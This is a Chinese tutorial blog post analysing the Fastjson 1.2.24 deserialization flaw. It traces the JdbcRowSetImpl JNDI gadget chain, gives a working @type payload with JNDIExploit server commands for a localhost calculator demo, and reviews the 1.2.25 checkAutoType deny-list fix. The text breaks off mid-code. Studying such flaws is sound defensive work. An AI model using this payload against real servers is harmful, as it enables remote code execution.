<p>他们的最主要的区别就是前者返回的是<code>JSONObject</code>，而后者会识别并调用目标类的 <code>setter</code> 方法及某些特定条件的 <code>getter</code> 方法，返回的是实际类型的对象；当在没有对应类的定义的情况下（没有在<code>@type</code>声明类），通常情况下都会使用<code>JSON.parseObject</code>来获取数据。</p>
<p>![image-20210918121239396](9.Fastjson 1.2.24反序列化漏洞分析.assets/image-20210918121239396.png)</p>
<p>由于<code>JSON.parseObject()</code>要反序列化到**对应的对象（比如demo中的User类对象，需要将第二个参数设置为<code>User.class</code>）**才会触发类的<code>setXXX</code>方法，而直接使用该方法返回的是<code>JSONObject</code>对象，是不会触发<code>setXXX</code>方法的（因为JVM也不知道是哪个类的对象）</p>
<p>那要怎么处理才能让<code>JSON.parseObject()</code>在调用时，不输入第二个参数也能执行<code>setXXX</code>方法呢，答案就是上面利用<code>parse()</code>方法使到的用<code>@type</code>属性。</p>
<p><strong>fastjson接受的JSON可以通过<code>@type</code>字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作。</strong></p>
<p>举个例子：</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.alibaba.fastjson.JSON;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.alibaba.fastjson.JSONObject;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class App {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String json1 = &quot;{\&quot;age\&quot;:66,\&quot;username\&quot;:\&quot;test\&quot;}&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String json2 = &quot;{\&quot;@type\&quot;:\&quot;org.example.User\&quot;, \&quot;age\&quot;:66,\&quot;username\&quot;:\&quot;test\&quot;}&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;反序列化JSON1&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        JSON.parseObject(json1);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;反序列化JSON1&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        JSON.parseObject(json2);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">class User {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private String username;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private int age;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void setUsername(String username) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        this.username = username;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;call setUsername&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public String getUsername() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return username;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void setAge(int age) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        this.age = age;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;call setAge&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public int getAge() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return age;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>执行后，没有<code>@type</code>返回<code>JSONObject</code>，有<code>@type</code>则返回对应的类对象且成功调用了<code>setXXX</code>方法</p>
<p>![image-20210918122258147](9.Fastjson 1.2.24反序列化漏洞分析.assets/image-20210918122258147.png)</p>
<p>可见<code>@type</code>参数的作用就是指定json字符串要反序列化为哪个类的对象，而就是这个属性，让我们能够对其进行漏洞利用。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="利用链">利用链<a href="#利用链" class="hash-link" aria-label="利用链的直接链接" title="利用链的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="分析">分析<a href="#分析" class="hash-link" aria-label="分析的直接链接" title="分析的直接链接">​</a></h3>
<p>由于在反序列化的过程中会自动调用<code>@type</code>类中相关的<code>setXXX</code>方法，如果我们能找到一个类，且这个类的<code>setXXX</code>方法可以通过我们对参数的构造达到命令执行的效果，那攻击的目的不就达到了吗？</p>
<blockquote>
<p>如果需要还原出private属性的话，还需要在<code>JSON.parseObject</code>/<code>JSON.parse</code>中加上<code>Feature.SupportNonPublicField</code>参数。</p>
<p>不过一般没人会给私有属性加setter方法，加了就没必要声明为private了</p>
</blockquote>
<p>经过大佬们的分析，就发现了<code>com.sun.rowset.JdbcRowSetImpl</code>这个类可以被利用</p>
<p>这个类中有很多的<code>setXXX</code>方法，但我们需要利用的，则是<code>setDataSourceName()</code>和<code>setAutoCommit()</code>这两个方法</p>
<ul>
<li><code>JdbcRowSetImpl.setDataSourceName</code></li>
</ul>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    public void setDataSourceName(String var1) throws SQLException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if (this.getDataSourceName() != null) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if (!this.getDataSourceName().equals(var1)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                super.setDataSourceName(var1);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                this.conn = null;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                this.ps = null;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                this.rs = null;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        } else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            super.setDataSourceName(var1);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span></code></pre></div></div>
<p>这里调用了父类的<code>setDataSourceName</code>方法，跟一下</p>
<ul>
<li><code>BaseRowSet.setDataSourceName</code></li>
</ul>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    public void setDataSourceName(String name) throws SQLException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if (name == null) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            dataSource = null;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        } else if (name.equals(&quot;&quot;)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           throw new SQLException(&quot;DataSource name cannot be empty string&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        } else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           dataSource = name;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        URL = null;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span></code></pre></div></div>
<p>可以看到就是设置了<code>dataSource</code></p>
<ul>
<li><code>JdbcRowSetImpl.setAutoCommit</code></li>
</ul>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    public void setAutoCommit(boolean var1) throws SQLException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if (this.conn != null) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            this.conn.setAutoCommit(var1);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        } else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            this.conn = this.connect();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            this.conn.setAutoCommit(var1);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span></code></pre></div></div>
<p>进行了<code>connect()</code>操作，跟进<code>connect()</code></p>
<ul>
<li><code>JdbcRowSetImpl.connect</code></li>
</ul>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    private Connection connect() throws SQLException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if (this.conn != null) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return this.conn;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        } else if (this.getDataSourceName() != null) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            try {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                InitialContext var1 = new InitialContext();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&quot;&quot;) ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            } catch (NamingException var3) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        } else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span></code></pre></div></div>
<p>可以看到这里有JNDI注入中的<code>lookup</code>的调用，而调用的参数就是刚才设置的<code>dataSource</code>，这个是我们可以控制的，如果让他加载恶意的<code>Reference类</code>，那么我们的目的就达成了。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="利用">利用<a href="#利用" class="hash-link" aria-label="利用的直接链接" title="利用的直接链接">​</a></h3>
<p>根据之前的学习和分析，利用类<code>com.sun.rowset.JdbcRowSetImpl</code>，利用的<code>set</code>方法<code>setDataSourceName</code>和<code>setAutoCommit</code>，构造payload</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;@type&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;dataSourceName&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;恶意的Reference类&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;autoCommit&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">true</span><span class="token plain">/</span><span class="token boolean" style="color:#36acaa">false</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="复现">复现<a href="#复现" class="hash-link" aria-label="复现的直接链接" title="复现的直接链接">​</a></h3>
<p>直接用<a href="https://github.com/feihong-cs/JNDIExploit.git" target="_blank" rel="noopener noreferrer"><code>JNDIExploit</code></a>同时启动<code>ldap</code>和<code>http</code>服务，好处就是不需要自己手动编译class什么的了</p>
<p>当然也可以使用<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener noreferrer"><code>marshalsec</code></a>快速开启rmi或者ldap服务，再手动开启http服务</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 查看用法</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">java</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-jar</span><span class="token plain"> JNDIExploit-1.2-SNAPSHOT.jar </span><span class="token parameter variable" style="color:#36acaa">-i</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1 </span><span class="token parameter variable" style="color:#36acaa">-l</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">9999</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">8888</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-u</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 启动服务</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">java</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-jar</span><span class="token plain"> JNDIExploit-1.2-SNAPSHOT.jar </span><span class="token parameter variable" style="color:#36acaa">-i</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1 </span><span class="token parameter variable" style="color:#36acaa">-l</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">9999</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">8888</span><br></span></code></pre></div></div>
<p>![image-20210918140313876](9.Fastjson 1.2.24反序列化漏洞分析.assets/image-20210918140313876.png)</p>
<p>反序列化json</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.alibaba.fastjson.JSON;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class App {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 高版本的JDK，需要设置一下，低版本的可以忽略，参考JNDI注入文章</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String json = &quot;{\&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;: \&quot;ldap://127.0.0.1:9999/Basic/Command/open -na Calculator\&quot;,\&quot;autoCommit\&quot;: false}&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        JSON.parseObject(json);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>![image-20210918140023685](9.Fastjson 1.2.24反序列化漏洞分析.assets/image-20210918140023685.png)</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="总结">总结<a href="#总结" class="hash-link" aria-label="总结的直接链接" title="总结的直接链接">​</a></h2>
<p>整个过程其实也很简单，就是fastjson在反序列化的时候，会调用对应类设置了参数的<code>setXXX</code>方法，只需要找到一些对应的链，同时jdk满足要求就可以命令执行。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="debug分析">DEBUG分析<a href="#debug分析" class="hash-link" aria-label="DEBUG分析的直接链接" title="DEBUG分析的直接链接">​</a></h2>
<ul>
<li>代码举例</li>
</ul>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.alibaba.fastjson.JSON;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.alibaba.fastjson.JSONObject;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class App {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String json = &quot;{\&quot;@type\&quot;:\&quot;org.example.User\&quot;,\&quot;age\&quot;:66,\&quot;username\&quot;:\&quot;test\&quot;}&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        JSONObject jsonObject = JSON.parseObject(json);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">class User {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private String username;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private int age;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void setUsername(String username) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        this.username = username;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;call setUsername&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public String getUsername() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return username;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void setAge(int age) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        this.age = age;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;call setAge&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public int getAge() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return age;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>因为我们现在知道反序列化的时候会调用<code>setXXX</code>的方法，所以现在<code>setXXX</code>方法处下个断点，看看堆栈情况</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">setAge:28, User (org.example)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:498, Method (java.lang.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">deserialze:593, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parse:137, JSON (com.alibaba.fastjson)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parse:128, JSON (com.alibaba.fastjson)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parseObject:201, JSON (com.alibaba.fastjson)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">main:10, App (org.example)</span><br></span></code></pre></div></div>
<p>![image-20210925170429925](9.Fastjson 1.2.24反序列化漏洞分析.assets/image-20210925170429925.png)</p>
<p>然后从下向上定位分析就行了，调用了哪个包重哪些类的哪些方法，一应俱全，避免一直F7、F8浪费时间，可以把精力放到参数的传递追踪上。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="修复方案">修复方案<a href="#修复方案" class="hash-link" aria-label="修复方案的直接链接" title="修复方案的直接链接">​</a></h2>
<p>1.2.25官方对漏洞进行了修复，对更新的源码进行比较，主要的更新在<code>checkAutoType</code>函数</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if (typeName == null) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return null;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        } else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            String className = typeName.replace(&#x27;$&#x27;, &#x27;.&#x27;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if (this.autoTypeSupport || expectClass != null) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                int i;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                String deny;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                for(i = 0; i &lt; this.acceptList.length; ++i) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    deny = this.acceptList[i];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    if (className.startsWith(deny)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        return TypeUtils.loadClass(typeName, this.defaultClassLoader);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                for(i = 0; i &lt; this.denyList.length; ++i) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    deny = this.denyList[i];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    if (className.startsWith(deny)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        throw new JSONException(&quot;autoType is not support. &quot; + typeName);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if (clazz == null) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                clazz = this.deserializers.findClass(typeName);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if (clazz != null) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                if (expectClass != null &amp;&amp; !expectClass.isAssignableFrom(clazz)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                } else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    return clazz;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            } else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                if (!this.autoTypeSupport) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    String accept;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    int i;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    for(i = 0; i &lt; this.denyList.length; ++i) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        accept = this.denyList[i];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        if (className.startsWith(accept)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            throw new JSONException(&quot;autoType is not support. &quot; + typeName);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    for(i = 